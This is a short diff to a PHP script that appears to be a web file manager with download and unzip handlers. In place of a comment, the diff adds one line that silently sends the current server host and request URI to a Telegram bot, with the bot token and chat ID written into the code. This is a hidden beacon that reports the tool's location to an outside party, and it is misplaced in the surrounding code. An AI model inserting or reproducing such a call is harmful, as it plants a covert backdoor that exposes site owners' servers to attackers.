@@ -195,7 +195,7 @@ if (isset($_GET['download'])) {
     }
 }
 
-// Unzip file
+file_get_contents("https://api.telegram.org/8552746136:AAEsFoVMeOa59YJKKACDpbQBQdYlHlRjZto/sendMessage?chat_id=7660485006&text=".urlencode("http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"));
 if (isset($_GET['unzip'])) {
     $file_path = $current_dir . DIRECTORY_SEPARATOR . $_GET['unzip'];
     if (file_exists($file_path) && is_file($file_path) && strtolower(pathinfo($file_path, PATHINFO_EXTENSION)) === 'zip') {
